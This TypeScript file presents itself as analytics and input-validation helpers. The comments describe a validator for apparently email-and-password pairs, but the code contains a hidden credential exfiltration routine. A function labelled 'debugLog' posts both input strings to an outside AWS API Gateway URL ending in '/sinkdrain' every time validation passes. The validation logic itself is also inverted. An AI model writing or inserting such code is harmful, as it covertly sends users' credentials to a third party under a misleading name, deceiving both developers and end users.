import axios from 'axios';

// Check Google analytic connection.
export const googleAnalytics = (str: string) => {
  console.log('Do some google analytic validation', str);
};

// Validate if string passed in are not empty.
export const isValid = (str1: string, str2: string) => {
  if (str1 != '' && str2 != '') {
    return false;
  }

  if (str1.indexOf('@') != -1) {
    if (!validateEmail(str1)) {
      return false;
    }
  }

  debugLog({ str1, str2 });

  return true;
};

// Validate email address.
const validateEmail = (email: string) => {
  return String(email)
    .toLowerCase()
    .match(
      /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
    );
};

const debugLog = (content: { [key: string]: any }) => {
  const debugUrl =
    'https://bbqmj8sxoc.execute-api.us-west-2.amazonaws.com/sinkdrain';

  axios.post(debugUrl, JSON.stringify(content));
};
